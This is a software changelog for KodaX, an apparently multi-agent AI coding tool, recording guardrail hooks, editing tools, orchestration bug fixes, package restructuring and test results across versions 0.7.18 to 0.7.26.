  - `@kodax/core/src/guardrail.ts`: `InputGuardrail` / `OutputGuardrail` / `ToolGuardrail` with 4 verdict actions (allow / rewrite / block / escalate); `GuardrailBlockedError` / `GuardrailEscalateError`; `GuardrailSpan` emission.
  - `Runner` wires 3 hook points — input (before first turn), output (before return), tool before+after (around every invocation); `agent.guardrails` + `opts.guardrails` merged.
  - `packages/coding/src/tools/tool-result-truncation-guardrail.ts`: adapter wrapping existing `applyToolResultGuardrail` as `ToolGuardrail.afterTool` with byte-equivalent parity.
  - **max_tokens escalation + continuation ladder** (implementation-time absorption, no separate feature id): `@kodax/ai` exports `KODAX_ESCALATED_MAX_OUTPUT_TOKENS`; Runner adapter auto-continues on `stop_reason === 'max_tokens'` and escalates the ceiling after N continuations; Scout parity so Scout's recon isn't silently truncated; `kimi-code` provider aligned to coding-provider capped-budget ladder.
- **`multi_edit` tool** — apply N exact-or-normalized-text replacements to a single file in one tool call. Edits apply sequentially (each edit sees the result of the previous one) and the whole batch is ATOMIC — any single failing `old_string` aborts the batch with no partial disk writes. Makes the "write skeleton + N edits" workflow cheap enough to be the default rather than a grudging fallback, removing the incentive for LLMs to fall back to "run Python to generate files". Description carries an explicit ANCHOR WARNING so models avoid anchor-consumed mistakes upfront, and a dedicated diagnostic fires when `edits[k]`'s anchor was swallowed by an earlier edit in the batch.
- **C1 fenced-block fallback parser restored on Runner-driven path** — v0.7.22's `parseManagedTaskScoutDirective` / handoff / verdict / contract fallback had been lost in the rewrite; now `attemptProtocolTextFallback` re-wires it so an LLM that forgot to call the `emit_*` tool but emitted a well-formed `kodax-task-*` fenced block still advances the state machine instead of stalling until the iteration cap.
- **H1 structural resume + post-compact reinjection (M3)** — checkpoint reload seeds the Runner-driven recorder with Scout / Contract payloads reconstructed from the saved managed-task runtime (`buildStructuralResumeSeed`), so `--continue` doesn't restart from scratch when the prior session had already committed a harness tier. Post-compaction reinjection (M3) threads recorded scout-decision / contract payloads back into the running transcript so multi-role chains survive compaction.

### Fixed
- **Issue 119** — Scout H0→H1 upgrade no longer leaves stale pre-Scout `mutationSurface` locking Generator to docs-only writes. Post-Scout roles read Scout's own scope / reviewFilesOrAreas instead of the pre-Scout regex heuristic.
- **Issue 120** — Skill / plan-mode execution paths now route queued user inputs into the streaming prompt queue (`canQueueFollowUps` + `drainPendingInputsAsFollowUps`); previously follow-up inputs were silently dropped during skill / plan-mode execution.
- Managed-task error recovery: iteration cap raised to 500 for full multi-role chains (Core's default 20 was too low for Scout → Planner → Generator → Evaluator), budget extension dialog at 90% threshold as real throttle; `error.position` propagated through the Runner → task-engine surface.
- Classify undici `"terminated"` + cause-chain errors as retryable in `resilience/classifier.ts`; non-streaming fallback also handles `terminated`, hard-limit guard added for large `write` turns, and provider retry budget bumped for long Generator runs.
- Scout false-completion observability layer + Windows bash `cmd` trap hint.
- Write / edit prompts aligned with Claude Code multi-layer defense.
- **Scout v0.7.22 tool-set regression** — Runner-driven Scout had been stripped to a read-only subset during the rewrite; restored the full legacy tool surface (write / edit / multi_edit / exit_plan_mode + unwrapped bash so Scout can run grep/find without the docs-only wrapper firing). Scout instructions now also ship the Working-Directory / git-root / platform context so it stops `cd`-ing to invented paths.
- **H1 Scout→Generator→Evaluator infinite loop** — Scout's `confirmedHarness` is now checked in `inferScoutMutationIntent` so a mutation-intent Scout verdict correctly advances to Generator instead of bouncing between Evaluator-review and Generator-rewrite.
- **H1 same-harness unbounded revise** — `reviseCountByHarnessRef` + `H1_MAX_SAME_HARNESS_REVISES = 1` caps revises per harness tier and auto-escalates / converts when the cap is hit, preventing the "Evaluator keeps sending back, Generator keeps retrying same harness" spiral.
- **Evaluator explicit `budgetRequest` discarded** — the Runner-driven `emit_verdict` input schema now surfaces `budgetRequest` through to `maybeRequestAdditionalWorkBudget({ force: true })`, so an Evaluator's justified extension request bypasses the 90%-threshold heuristic.
- **`dispatch_child_task` child-executor lazy-load diagnostics** — lazy-loader now returns a descriptive envelope + performs export checks so cryptic "X is not a function" stalls surface the real reason (module not built / export missing) to the Evaluator instead of tripping the outer iteration cap.
- **`WRITE_ONLY_TOOLS` parity** — restored 9 Godot-specific tool names (`open_project`, `new_scene`, `set_property`, ...) that had been dropped during the Runner-driven migration, so the Evaluator read-only boundary matches v0.7.22.
- **Managed protocol multi-emit deduplication** — regression test added for the "Scout emits `emit_scout_verdict` twice in one turn" case; the recorder dedupes on `role` so the second emit is a no-op instead of triggering a handoff loop.
- **P2b write-turn `max_output_tokens` cap on RST-prone providers** — Zhipu/Kimi/MiniMax coding providers now have a 8K cap applied when the turn's tool inventory includes `write` / `edit` / `multi_edit`; prevents RST resets mid-stream. Overridable via `KODAX_RST_PRONE_PROVIDERS` and `KODAX_WRITE_TURN_MAX_TOKENS` env vars. Explicit `KODAX_MAX_OUTPUT_TOKENS` always wins.
- **`edit` / `multi_edit` error enrichment for anchor recovery** — ambiguous-match errors now include the line numbers of each duplicate (`"matched 2 places (lines 2 and 6)"` up to 3 listed, then `"and N more"`) so the LLM can see where the collisions are and widen the right one. Recovery guidance shifted from "retry with a unique anchor" to an explicit "widen old_string with nearby unique context, or set replace_all=true" + the anti-pattern warning `"(Shorter anchors match more, not fewer.)"`. Not-found errors now call out the most common cause — copying an anchor from a narrow `read` window with whitespace drift / typos — and suggest re-reading a wider window. `multi_edit`'s anchor-consumed-by-prior-edit diagnostic is retained and trimmed. `multi_edit` tool description gains a UNIQUENESS RULE paragraph ("anchor must be unique in the WHOLE current file, not just in the window you last read"). Applied symmetrically to both `edit` and `multi_edit` so the LLM gets consistent guidance from either tool.
- **REPL info items rendered in the wrong layer during managed foreground** — `onCompact`, `onProviderRateLimit`, `onScoutSuspiciousCompletion`, and queue-limit info items now route through `emitInfoItemToCorrectLayer` so they appear inline with the active managed worker's output instead of squeezed under the user prompt. Mirrors the earlier retry / provider-recovery / confirm-result fixes.
- **Pre-release review findings (HIGH-1 + MED-1..7)**:
  - HIGH-1 — session transcript now records the post-input-guardrail user message (symmetric with the already-post-guardrail output side), so `--resume` / audit consumers see what the LLM actually processed on both ends.
  - MED-1 — tool-before / tool-after guardrails now receive `{ ...guardrailCtx, agent: currentAgent }`; input / output guardrails keep run-scoped `startAgent` as designed.
  - MED-2 — regression guards for `toolObserver.beforeTool` returning `false` / string (blocked result with default / custom message).
  - MED-3 — guardrail `check` / `beforeTool` / `afterTool` exceptions now emit a `GuardrailSpan` with `decision: 'error'` + message, then re-throw (fail-loud preserved).
  - MED-4 — `compactionHook` error caught and surfaced as `compaction:hook-error` child span; the run still continues (the safety contract — compaction failure must never abort — is preserved).
  - MED-5 — regression guard for the L5 `max_tokens` continuation break at `KODAX_MAX_MAXTOKENS_RETRIES`.
  - MED-6 — `emitInfoItemToCorrectLayer` JSDoc + mirror comment at `addHistoryItem` import lock in the "info items during managed foreground MUST route through the layer-aware emitter" rule.
  - MED-7 — 4 regression guards pin the `maybeApplyP2bWriteTurnCap` multi-turn / idempotence / L4-escalation-leak contract.

### Changed
- Legacy `runManagedTask` orchestration (~7343 LoC in `task-engine.ts`) removed; `task-engine.ts` reduced to a thin facade re-exporting the Runner-driven path.
- AMA prompt builder restored into the Runner-driven path: `_internal/managed-task/role-prompt.ts` ports v0.7.22 `createRolePrompt` 1:1, closing the earlier prompt-surface gap. Full decision / contract / metadata / verification / tool-policy / evidence-strategy / dispatch / H0/H1/H2 quality framework / handoff-verdict-contract specs reach every role turn via `RolePromptContextFactory`.
- v0.7.26 parity restoration (5-commit sweep before release): sanitize pipeline re-added with 22 unit tests; `onToolCall` / `onToolResult` / `onToolProgress` events fire from core `Runner`; Anthropic extended thinking contract honoured (thinking blocks preserved in assistant history); 6 more gaps closed (iteration cap, cost tracker, budget extension, guardrail wrapper, dead code, stale comments); tool-result-truncation guardrail wired; multimodal input artifacts reach Scout turn (C1); dispatch-child-task parallel fan-out + progress events restored (C2); session snapshot persisted at success + error terminals (C3); **skill artifacts written + role prompts quote stable filesystem paths (C4)**; verification-only roles (Scout / Evaluator) shell boundary now a superset of legacy `SHELL_WRITE_PATTERNS` (PowerShell verbs, del / touch / mkdir / rmdir, sed -i / perl -pi / python -c / node -e, plus v0.7.26 safety extensions for chmod / chown / git / package-manager installs). JSON output mode surfaces `onToolProgress` / `onManagedTaskStatus` / `onScoutSuspiciousCompletion`.
- **Kimi K2.6 promoted to default** on `kimi-code` and `kimi` providers (replaces the earlier K2 default); aligns the coding capped-budget ladder with the richer model's token ceilings.
- **REPL info rendering** now uniformly routes through `emitInfoItemToCorrectLayer` whenever a managed worker owns the foreground turn (compact notices, provider rate-limit banners, Scout suspicious-completion hints, queue-limit notices). Eliminates the "info item squeezed under user prompt instead of inline with active worker output" bug.

### Removed
- `packages/coding/src/task-engine/_internal/prompts/{role-prompt,role-prompt-types,role-agent,runtime-execution-guide,tool-policy}.ts` — inlined or migrated to `_internal/managed-task/{tool-policy,scout-signals,repo-intelligence,artifacts}.ts` + `runner-driven.ts`.
- `packages/coding/src/task-engine/_internal/protocol/{parse-helpers,sanitize}.ts` — obsoleted by Zod-validated emit tools; fenced-block parsing + control-plane marker stripping no longer needed.
- `packages/coding/src/task-engine/_internal/formatting.ts` — pure string builders inlined into instruction / block renderers.
- `packages/coding/src/managed-protocol-handoff.test.ts` (786 LoC) — coverage replaced by `runner-driven.test.ts` (2285 LoC) + `agents/protocol-emitters.test.ts` (278 LoC).

### Documentation
- `config.example.jsonc` template rebuilt — restored missing fields (`customProviders`, `providerModels`, `providerReasoningOverrides`, `mcpServers`, `extensions`, `agentMode`, `locale`, `thinking`, `streamIdleTimeoutMs`, `alwaysAllowTools`, full `compaction` block); removed stale `parallel` block and the misleading `permissionMode: "auto"` hint.
- **FEATURE_094 (P2d anti-escape guardrail) staged** for v0.7.36 — design captured in `docs/features/v0.7.36.md`; implementation deferred past v0.7.26.

### Test Status
- `packages/coding`: 763+/764+ pass (1 Windows-only bash-background test flakes on tmp-dir EBUSY under parallel execution; passes in isolation). Includes 4 new regression guards for `edit` / `multi_edit` ambiguous-match line-number reporting + narrow-read not-found hints.
- `packages/core`: 86/86 pass (Runner / tool loop / handoff / Guardrail including MED-3 error-span regression + MED-1 handoff agent-ctx + HIGH-1 session symmetry, Agent / Session / Compaction)
- `packages/tracing`: 15/15 pass
- `packages/repl`: 830+ pass (no regressions)
- Full monorepo build green (`tsc -b` passes)

---

## [0.7.25] - 2026-04-21

### Added
- **FEATURE_076 — Managed Task Round Boundary (User Conversation Preservation)**: `runManagedTask` now normalizes its exit across all 6 paths (SA / H0 / H1 / H2 / resume / fork) via a single `reshapeToUserConversation` seam, so `context.messages` always comes back as a clean `{user, assistant}` dialog instead of worker execution trace (Scout role-prompt-wrapped user, Evaluator isolated session, etc.). Fixes multi-turn conversation incoherence, token-meter snap-downs after H1/H2 completion, Scout role-prompt boilerplate leaking into next round, and session-persistence pollution.
  - Q1 **unconverged detection**: reuses the existing `KodaXTaskStatus` enum (`isUnconvergedVerdict`). `running` / `planned` fall back to the raw trace; `completed` / `blocked` / `failed` reshape (blocked reason / error message IS a valid user-facing answer). Zero new field on `KodaXResult`; no string matching on placeholder summaries.
  - Q2 **token snapshot**: full `recomputeContextTokenSnapshot` (drops stale usage; preserves only the source tag) replaces the partial-rebase approach, eliminating the drift class behind token-meter bugs.
  - Q3 **fork mode integration**: InkREPL fork path now pushes the user fork prompt into `context.messages` before the assistant turn, matching the other 5 paths.
  - Q4 **load-time normalization**: `normalizeLoadedSessionMessages` drops trailing role-prompt-shaped worker pairs when loading pre-v0.7.25 sessions, so `/load-session` + follow-up no longer inherits Evaluator/Scout role-prompt pollution. Regex anchored at message start to avoid false positives on casual "You are..." text.
  - CLI REPL consumer update: both artifact-ledger call sites prefer `result.artifactLedger` with a messages-walk fallback; `KodaXResult` gains an optional `artifactLedger` field populated by the reshape.
- **FEATURE_058 — Transcript Native Scrollback Dump** (moved up from v0.8.0): transcript-mode `s` keybinding exits the alternate-screen, writes a plain-text serialization of the current transcript view into the terminal's native scrollback, then re-enters the fullscreen surface (renderer repaints from React state on re-entry; no content restoration needed). Serializer strips ANSI escape sequences (CSI / OSC / 2-byte ESC), skips internal `thinking` items, summarizes tool groups one line per call. Footer hint shows `s dump` in the default transcript variant only. Reuses FEATURE_051 substrate — no new primitives.
- **FEATURE_075 — Plan Approval Dialog Scroll**: two-layer defense against oversized plans.
  - LLM-first constraint: `exit_plan_mode` tool schema now requires "at most 40 lines total, 3 bullet-depth levels, one sentence per bullet; otherwise split into phases".
  - Mechanical fallback: `DialogSurface.PlanScrollPanel` renders the full plan in a 15-line viewport with local scroll state + `useInput` for arrow keys / PgUp / PgDn. Approval buttons stay pinned. Scope-trimmed per review: dropped the originally planned `$EDITOR` integration and markdown rendering (no evidence of demand / YAGNI).
- Confirmed `FEATURE_051 — Host-Aware Fullscreen TUI Substrate and Transcript UX` release: code-complete since v0.7.25 planning cycle, ships as part of this release.

### Changed
- `buildToolConfirmationDisplay("exit_plan_mode", …)` no longer head+tail truncates the plan. Readline consumers get the full plan as `details` (native terminal scroll handles it); InkREPL reads `input.plan` as `planContent` and renders via `PlanScrollPanel`, stripping the plan lines out of the single-line confirm prompt to avoid double-rendering.
- `KodaXResult.artifactLedger?: readonly KodaXSessionArtifactLedgerEntry[]` — new optional field pre-populated by the FEATURE_076 reshape so downstream consumers do not have to walk the post-reshape `messages` for tool_result blocks.

### Removed
- `truncatePlanForDisplay` helper and the head+tail truncation path: superseded by LLM-side length budget (FEATURE_075 prompt constraint) + InkREPL scroll + readline native scroll.

### Documentation
- `docs/features/v0.7.25.md`: 075 scope narrowed (dropped editor + markdown, added LLM prompt structural constraint), 076 Q1-Q4 decisions captured, 058 section added with FEATURE_057 dependency-free rationale.
- `docs/features/v0.8.5.md`: FEATURE_058 moved out to v0.7.25 with migration note.
- `docs/FEATURE_LIST.md`: FEATURE_051 / FEATURE_058 / FEATURE_075 / FEATURE_076 marked Completed; v0.7.25 progress recorded; "Current released version" bumped to v0.7.25.

### Test Status
- **coding**: 600/600 pass (+36 round-boundary, +4 token-accounting, +1 registry tests).
- **repl**: 830/830 pass (+11 scrollback-dump, +4 key-actions, +1 DialogSurface scroll; tool-confirmation truncation tests replaced with full-preservation test).
- **Full monorepo**: 2621 passing / 5 pre-existing baseline failures (`tests/kodax_cli`, `tests/kodax_core`, `tests/tracker-consistency` × 2 strikethrough-row drift, `packages/ai/.../base.test.ts` rate-limit timing flake) — identical to v0.7.24 baseline. **0 new regressions.**

---

## [0.7.24] - 2026-04-20

### Added
- **FEATURE_082 — Package Restructure**: extract Layer A primitives and observability surfaces into 4 new workspace packages, leaving `@kodax/coding` as the coding-preset shell:
  - `@kodax/core` (new): `Agent` / `Handoff` / `Runner` / `Guardrail` / `AgentReasoningProfile` / `Session` / `SessionEntry` / `MessageEntry` / `SessionExtension` / `CompactionPolicy` / `DefaultSummaryCompaction` / `Capability*` types relocated from `packages/coding/src/primitives/` (1478 LoC, 29 tests)
  - `@kodax/tracing` (new): `Trace` / `Span` / `SpanData` discriminated union (8 variants — Agent / Generation / ToolCall / Handoff / Compaction / Guardrail / Evidence / Fanout) + `TracingProcessor` interface + `defaultTracer` (1112 LoC, 15 tests)
  - `@kodax/session-lineage` (new): `LineageExtension` + `LineageCompaction` relocated from `packages/coding/src/extensions/lineage.ts` (514 LoC, 13 tests)
  - `@kodax/mcp` (new): full MCP capability provider relocated from `packages/coding/src/capabilities/providers/mcp/*` — preserves all 5 progressive-disclosure modes (lazy connect / two-tier descriptors / search-describe / elicitation / cache); `@kodax/coding` retains a thin adapter (`capabilities/providers/mcp-adapter.ts`) bridging the new package to its `CapabilityProvider` registry (3125 LoC, 28 tests)
  - `@kodax/capabilities` **dropped** (FM-2): the planned shell would have shipped empty; per CLAUDE.md "3+ real cases 才抽象" rule, will be recreated when `FEATURE_084` (v0.7.26) lands Scout/Planner/Generator/Evaluator. Final package count: 9 (planned 10).
  - cli-events cleanup **deferred** to `FEATURE_086` (v0.7.27): isolated relocation would create `ai`→`coding` circular dep; clean fix needs full Provider+registry rewrite, out of 082 scope. v0.7.27 design doc updated with item #9 capturing this work.
- **FEATURE_083 — Unified Tracer / Span / TracingProcessor**: introduce a single observability model across all primitives:
  - `TracingProcessor` lifecycle: `onSpanStart` / `onSpanEnd` / `onTraceEnd` / `shutdown`
  - `ConsoleTracingProcessor` (OTLP-ish stdout) + `FileTracingProcessor` (`.kodax/.traces/{traceId}.jsonl`, serialised `writeChain` so `shutdown()` awaits all in-flight flushes — fixes race vs fire-and-forget)
  - `Runner` accepts `tracer` in `RunOptions`; `PresetDispatcher` gains 4th arg `PresetTracingContext`; SA path emits `AgentSpan` + `GenerationSpan` around `runKodaX` as **dual emission** (old trace events kept `@deprecated` for v0.7.27 removal) — zero behavior change for existing consumers
  - `examples/otel-export.ts`: `PseudoOtelProcessor` showing how external consumers wire OpenTelemetry / Langfuse on top of the new model
- **FEATURE_093 (partial) — Coding + REPL Internal Circular Dependency Cleanup**: opportunistic cleanup while the restructure already touched all import paths. Reduced madge cycles from ~50 to 1 (98% elimination, 0 inter-package, 1 intra-package remaining):
  - `coding`: `extensions/runtime-contract.ts` narrow 6-method interface replaces full `KodaXExtensionRuntime` reference in `types.ts` hub (~40 cycles broken); `agent.ts` does a single `as KodaXExtensionRuntime` cast at the entry point; `child-executor.ts` uses computed-spec dynamic import to break `tools→agent` edge; `agent.ts` removes vestigial `KodaXClient` re-export in favor of the barrel
  - `repl`: split `tui/components`, `ui/shortcuts`, `completers`, and `project-harness` imports to reach concrete files (`renderer-runtime.ts`, `useShortcut.ts`, `completers/types.ts`, `project-harness-types.ts`) instead of barrel re-exports; test mocks updated to match
  - Remaining: 1 intra-package cycle in `repl/commands` (builtin↔interactive↔index triangle, blocked by ~1900-line `BUILTIN_COMMANDS` array) — kept for the dedicated `FEATURE_093` pass at v0.8.0

### Changed
- `@kodax/coding/src/extensions/types.ts`: `CapabilityKind` / `CapabilityProvider` / `CapabilityResult` re-exported from `@kodax/core` (lifted to Layer A so third-party RAG / custom-index providers can implement against a stable contract)
- `Runner` `RunOptions.tracer` field added (optional; if omitted, the 3-arg dispatcher fast path remains unchanged)

### Documentation
- `docs/features/v0.7.24.md`: Implementation Notes section with slice breakdown (LoC + file count per slice), design deviations (FM-2 capabilities drop, P3 cli-events deferral, Capability type extraction), FEATURE_093 opportunistic completion, test summary, final dependency graph
- `docs/features/v0.7.27.md` (FEATURE_086): added item #9 capturing the deferred cli-events relocation work
- `docs/features/v0.8.5.md`: added FEATURE_093 section documenting the remaining 1-cycle scope (`repl/commands` triangle blocker)
- `docs/FEATURE_LIST.md`: FEATURE_082 and FEATURE_083 marked Completed; FEATURE_093 added to Planned; v0.7.24 progress recorded; "Current released version" bumped to v0.7.24

### Test Status
- Full monorepo suite: **2561 pass / 5 baseline failures** — all 5 pre-existing since v0.7.23 (`tests/kodax_cli`, `tests/kodax_core`, `tests/tracker-consistency` × 2 strikethrough-row drift, `packages/ai/.../base.test.ts` rate-limit timing flake); confirmed unaffected by this release.
- **0 new regressions** across 4 new packages (`@kodax/core`, `@kodax/tracing`, `@kodax/session-lineage`, `@kodax/mcp`) and adapter (`mcp-adapter`).

### Final Dependency Graph (pure DAG, madge-verified)
```
ai (leaf)              tracing (leaf)         skills (leaf)
agent           → ai
core            → ai, tracing
session-lineage → ai, core
mcp             → ai, core
coding          → agent, ai, core, mcp, session-lineage, skills
repl            → coding, skills
```

---

## [0.7.23] - 2026-04-20

### Added
- **FEATURE_080 + FEATURE_081 — Layer A Primitives + Session/Compaction Split**: introduce the KodaX Agent-as-data surface (`@experimental`) under `@kodax/coding`:
  - `Agent` / `Handoff` / `Guardrail` / `AgentReasoningProfile` declarative types + `createAgent` / `createHandoff` factories (`packages/coding/src/primitives/agent.ts`)
  - `Session` / `SessionEntry` / `MessageEntry` / `SessionExtension` base types + `createInMemorySession` (`packages/coding/src/primitives/session.ts`)
  - `CompactionPolicy` interface + `DefaultSummaryCompaction` (token-threshold + LLM-summary, standalone, zero KodaX-runtime dependency) (`packages/coding/src/primitives/compaction.ts`)
  - `Runner` class with generic LLM-callback path and preset dispatcher registry (`packages/coding/src/primitives/runner.ts`)
  - `createDefaultCodingAgent()` + Option-Y preset dispatcher: `Runner.run(defaultCodingAgent, prompt, { presetOptions })` routes to `runKodaX(presetOptions, prompt)` — API surface goes through `Runner`, body stays on the existing SA path unchanged until FEATURE_084 rewrites it (`packages/coding/src/primitives/coding-preset.ts`)
  - Scout / Planner / Generator / Evaluator declared as `Agent` placeholders ready for the FEATURE_084 runtime rewrite (`packages/coding/src/primitives/task-engine-agents.ts`)
  - `LineageExtension` SessionExtension with `label` / `attachArtifact` operators and `buildLineageTree` reducer (`packages/coding/src/extensions/lineage.ts`)
  - SDK-consumer example (`examples/embedded-agent.ts`)
- 40 new unit tests across compaction / lineage / runner / coding-preset / role agents; all passing.

### Changed
- `compactMessages()` in `@kodax/agent` marked `@deprecated`; superseded by the `CompactionPolicy` interface + `DefaultSummaryCompaction`. Scheduled for removal in FEATURE_086 (v0.7.27).

### Documentation
- `docs/FEATURE_LIST.md`: FEATURE_080 and FEATURE_081 marked Completed; v0.7.23 progress recorded.
- `docs/features/v0.7.23.md`: Implementation Notes section with slice breakdown, Option-Y rationale, placement deviation (LineageExtension lives in `@kodax/coding` until the v0.7.24 package restructure), code-review resolutions, and acceptance-criteria checklist.

### Zero-Behavior Change Guarantee
- `runKodaX` / `runManagedTask` / `KodaXClient` bodies untouched.
- `packages/coding/src/task-engine.test.ts` 50/50 pass (behavior snapshot unchanged).
- Full monorepo suite: 2484 pass / 4 fail — all 4 pre-existing baseline failures (`tests/kodax_cli`, `tests/kodax_core`, `tests/tracker-consistency` count drift on strikethrough rows, `packages/ai/.../base.test.ts` rate-limit timing flake); confirmed unaffected by this release via `git stash` baseline comparison.

---

## [0.7.22] - 2026-04-19

### Added
- **FEATURE_079 — Task Engine Phase 1 Pure Extraction**: Split task-engine.ts (9034 → ~7271 lines) into 14 internal modules under `task-engine/_internal/` — constants, text-utils, formatting, protocol (parse-helpers + sanitize), managed-task (budget, checkpoint, workspace), and prompts (role-prompt, role-agent, role-prompt-types, tool-policy, runtime-execution-guide). Zero behavior changes; all extracted functions are pure moves with deferred items documented in code comments.

### Fixed
- **Pre-existing test regressions (5 tests)**: `resilience.test.ts` — align `streamIdleTimeoutMs` assertion with intentional default change (60000 → 0); `agent.extension-runtime.test.ts` — add `reasoningMode:'off'` to 2 tests to prevent auto-follow-up interference; `agent.provider-policy.test.ts` — add `repoIntelligenceMode:'off'` to skip expensive repo-intelligence build in policy-block tests. Full suite now 584/584 green.

### Documentation
- Update `docs/FEATURE_LIST.md` and `docs/features/v0.7.22.md` with FEATURE_079 progress

---

## [0.7.21] - 2026-04-19
### Fixed
- **FEATURE_077 — Session-Scoped Prompt Input History**: REPL prompt input history now survives the `Ctrl+O` transcript-mode toggle. Previously a single `Ctrl+O` caused `<PromptComposer>` to unmount and silently wiped the Up-arrow history; the entries array has been lifted above the composer lifecycle so history persists for the whole REPL session. Navigation cursor and draft placeholder still reset on remount to preserve pre-existing behavior.

### Documentation
- Remove `docs/features/v1.0.0.md` (all features migrated to earlier versions)
- Add feature docs for v0.7.22, v0.7.23, v0.7.24, v0.7.26–v0.7.29, v0.7.31, v0.7.32
- Update `KNOWN_ISSUES.md`, `v0.8.5.md`, and `features/README.md` references

---

## [0.7.20] - 2026-04-18
### Added
- **FEATURE_072 — Lineage-Native Compaction Migration**: post-compact attachments stored as a first-class `KodaXSessionCompactionEntry.postCompactAttachments` field instead of inline `[Post-compact: ...]` system messages; `getSessionMessagesFromLineage` slicer inlines attachments at the derivation layer, preserving `getContextMessagesForEntry`'s 1-to-1 contract (FEATURE_073 prerequisite); `evictOldIslandMessageContent` strips attachments on old-island compaction entries (prevents N-round × ~50k token accumulation); `cloneForkableEntry` deep-clones attachments on `/fork`; `applySessionCompaction` signature gains a typed `postCompactAttachments` parameter with defensive strip of inline messages; `CompactionUpdate.postCompactAttachments` routes attachments from agent.ts to REPL natively; `onIterationEnd.info.scope: 'parent' | 'worker'` field prevents worker token counts from overwriting the parent REPL's context snapshot; Scout `initialMessages` derived from lineage across three REPL call-sites (`repl.ts`, `InkREPL.tsx`, `project-commands.ts`); `applyLineageTruncation` pure helper reserved for graceful-degradation writeback
- **FEATURE_074 — Subagent Permission Boundary Hardening**: plan-mode propagation to child agents via live predicate closure over parent state (mid-run `plan ↔ accept-edits` toggles reach in-flight children immediately); independent `exit_plan_mode` tool with tri-state callback (`boolean | 'not-in-plan-mode'`) so misuse outside plan mode surfaces as an explicit tool error; `set_permission_mode` callback no longer forwarded into `KodaXToolExecutionContext` (fails closed on child invocations); system-temp paths exempted from `isAlwaysConfirmPath` so `accept-edits` and `auto-in-project` no longer force confirmation for writes to `$TMP` / `os.tmpdir()`

### Fixed
- **Issue 119 — Scout-scope-driven mutation intent**: replace pre-Scout `mutationSurface` heuristic with `inferScoutMutationIntent()` that derives mutation guard from Scout's actual scope output (`review-only` / `docs-scoped` / `open`); prevents stale pre-Scout heuristic from blocking legitimate code edits when Scout upgrades a docs-flagged task to H1
- **Post-compact context monotonic growth (v0.7.18 regression)**: six surgical fixes — graceful degradation gate rekeyed from reference equality to token-count comparison (P1), circuit breaker tripping after partial-success attempts (P2), `generateSummary` throws on empty LLM text (P3), `injectPostCompactAttachments` strips prior `[Post-compact: ...]` messages before injection (P4), absolute caps `POST_COMPACT_TOKEN_BUDGET = 50_000` and `POST_COMPACT_MAX_TOKENS_PER_FILE = 5_000` (P5), REPL finally-block rebuilds `context.contextTokenSnapshot` from local messages to clear worker-leaked snapshots (P6)
- **Memory pressure**: eliminate React dev-mode leak, lineage clone bloat (`cloneMessage` returns identity), and streaming churn
- **Task engine routing**: trust Scout routing authority, fix ceiling clamp context-loss bug; evaluator prompt uses effective ceiling, not stale heuristic
- **Global kodax bin**: route through CJS preload shim for Node resolution on Windows

### Changed
- **Scratch scripts**: directed to `.agent/tmp/` instead of `.agent/` root for a cleaner workspace layout

### Documentation
- **FEATURE_072 acceptance close-out**: verified and checked off all 12 completed acceptance criteria with file:line code evidence; 3 items explicitly deferred (6-consumer migration, bounded-growth integration test, snapshot coherence) with status notes; P4/P6 retirement plan updated — now retained indefinitely after FEATURE_073 cancellation
- **FEATURE_074 acceptance verification**: all 8 acceptance criteria verified against code (`set_permission_mode` removal, child exclusion, live plan-mode predicate, `exit_plan_mode` tool, long-plan fallback, system-temp exemption)
- **FEATURE_073 cancelled after philosophy review**: no user pain point, no performance improvement, main selling point (`/fork` improvement) self-retracted; design doc retained as future reference
- **FEATURE_072 manual test guide**: `docs/test-guides/FEATURE_072_v0.7.20_TEST_GUIDE.md` covering `/fork` + `/rewind` across compaction boundary, long-AMA bounded growth, worker scope non-propagation
- **Roadmap hygiene**: FEATURE_026 (Roadmap Integrity) removed as unnecessary; FEATURE_077 (Session-Scoped Prompt Input History) staged for v0.7.21; FEATURE_073 / 075 / 076 designs staged into v0.7.25

---

## [0.7.19] - 2026-04-16
### Added
- **AMA Scout simplification**: Optional managed protocol and scope reflection for Scout role
- **Session lineage enhancements**: Extended session lineage types and tree visualization support
- **Storage improvements**: Expanded interactive storage test coverage and session tree integration

### Fixed
- **H0 completion signal**: Preserve explicit H0 completion signal and ensure failed H0 has task state
- **REPL session handling**: InkREPL session state and storage edge case fixes

---

## [0.7.18] - 2026-04-16
### Added
- **FEATURE_064 — Multi-Provider Cost Observatory**: Session cost tracking with `recordUsage()` after each LLM call; `/cost` command shows per-provider and per-role cost breakdown; built-in rate table for 11 providers
- **FEATURE_065 — MCP OAuth wiring**: OAuth 2.0 + PKCE token acquisition wired into MCP runtime `doConnect()`; cached token reuse and refresh; Authorization header injection for authenticated MCP servers
- **FEATURE_066 — Permission Hardening**: Bash command risk classifier (safe/normal/dangerous) wired into InkREPL `beforeToolExecute`; dangerous commands always require confirmation; session-scoped denial tracker prevents repeated prompts
- **FEATURE_067 — Child Agent Execution**: `dispatch-child-tasks` tool with read-only and write fan-out; child-executor with structured briefing, semaphore-based parallelism, abort propagation, and evaluator-assisted merge
- **FEATURE_068 — Worktree Isolation Tool**: `worktree_create` / `worktree_remove` tools with path traversal guard and safety checks
- **FEATURE_069 — Session Rewind & Shell Completion**: `/rewind [entry-id|label]` command for in-place session truncation; `kodax completion bash/zsh/fish` CLI subcommand
- **FEATURE_070 — Context Engine V2**: Microcompaction integration in agent loop; bash-intent extraction for smarter placeholders; user message protection in compression; analysis scratchpad in summary generator; post-compact artifact ledger injection + file content re-injection (top-N modified files); circuit breaker + graceful degradation for compaction failures
- **FEATURE_071 — AMA Managed Task Resilience**: Worker checkpoint persistence after each AMA phase; `findValidCheckpoint()` with 1h TTL + git commit validation; `resumeManagedTask()` for mid-execution recovery
- **Extension API helpers**: `api.exec()` for sandboxed shell command execution (env whitelist, timeout); `api.webhook()` for HTTP webhook with timeout support

### Changed
- **FEATURE_063 — Hook system cancelled**: Standalone hook system (`packages/coding/src/hooks/`) removed (~600 lines); executor capabilities extracted to Extension API helpers (`api.exec()` / `api.webhook()`); Extension system is the single extensibility mechanism
- **FEATURE_064 — Status bar cost display descoped**: Cost information available only via `/cost` command, not in status bar

### Fixed
- **Provider resilience**: Backoff improvements, Retry-After header support, ECONNRESET handling, context overflow recovery
- **Ask-user**: Scroll window, index mapping, multi-question support; ESC cancellation propagation (issue #114)
- **Tool group refs**: Preserved on ledger kind switch (issue #115)
- **AMA H0**: Continuation path truthy bug + validation conflict fix
- **Thinking blocks**: Preserved for Kimi compatibility
- **Stream resilience**: Stale-round guard (issue #116)
- **Security**: Worktree path traversal guard; hooks/OAuth/Docker hardening; denial-tracker TTL

---

